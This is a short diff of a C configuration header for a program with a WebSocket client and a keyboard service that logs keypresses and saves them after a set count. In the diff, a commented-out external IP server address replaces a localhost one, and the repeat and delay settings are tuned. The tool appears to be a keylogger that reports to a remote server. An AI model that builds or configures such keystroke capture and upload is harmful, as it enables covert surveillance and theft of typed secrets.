@@ -16,12 +16,12 @@
 #if SERVICE_WEBSOCKET_ENABLED
 
 // WebSocket server host
-// #define WS_HOST "ws://localhost:8080/"
-#define WS_HOST "ws://localhost:25565/"
+#define WS_HOST "ws://localhost:8080/"
+// #define WS_HOST "ws://5.58.91.27:25565/"
 
 // After how many seconds server retries to connect
 // after fail
-#define WS_CONNECTION_DELAY_SEC 1
+#define WS_CONNECTION_DELAY_SEC 5
 
 #endif
 
@@ -33,13 +33,10 @@
 
 // Amount of keypresses of the same button
 // after which keyboard stops logging it
-#define KBD_MAX_REPEATS 5
+#define KBD_MAX_REPEATS 100
 
 // How many times key should be pressed to save data
 #define KBD_KEYS_TO_SAVE 100
-
-// Name of keyboard service working directory
-#define KBD_DIR "kbd"
 
 #endif
 
